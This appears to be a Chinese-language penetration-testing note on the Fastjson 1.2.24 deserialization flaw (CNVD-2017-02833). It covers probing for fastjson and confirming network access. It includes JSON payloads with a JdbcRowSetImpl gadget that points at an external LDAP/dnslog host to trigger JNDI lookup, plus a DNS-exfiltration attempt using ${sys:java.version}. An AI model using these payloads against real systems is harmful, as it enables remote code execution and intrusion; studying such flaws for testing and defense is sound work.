| CNVD-2017-02833 | 无黑名单，`@type` 直接加载类 | 默认开启 | `JdbcRowSetImpl` 触发 JNDI |
| --------------- | ------------------ | ---- | ------------------------ |
|                 |                    |      |                          |

构造数据，恶意破坏结构，看后端是否存在采用fastjson解析对应字符串，进行判断是否存在漏洞


疑似存在后，尝试判断版本，这里1.2.24直接用jdbc链去看下

判断下是否出网






dns回显
```
{"zero":{"@type":"java.net.Inet4Address","val":"dnslog.com"}}

{"name":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://6o9v16.dnslog.cn/Exploit","autoCommit":true}}
```

![](images/Pasted%20image%2020261006160059.png)

![](images/Pasted%20image%2020261006160114.png)

![](images/Pasted%20image%2020261006161019.png)
![](images/Pasted%20image%2020261006161031.png)
实现DNS外带信息
```
jdbc链的dataSource不能外带，不跟log4j的lookup一样，能解析$符号
	{"name":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://${sys:java.version}.nbqgqy.dnslog.cn/Exploit","autoCommit":true}}
intnet可以，但是同样解析不了
	{"zero":{"@type":"java.net.Inet4Address","val":"${sys:java.version}.nbqgqy.dnslog.cn"}}
```

![](images/Pasted%20image%2020261006162359.png)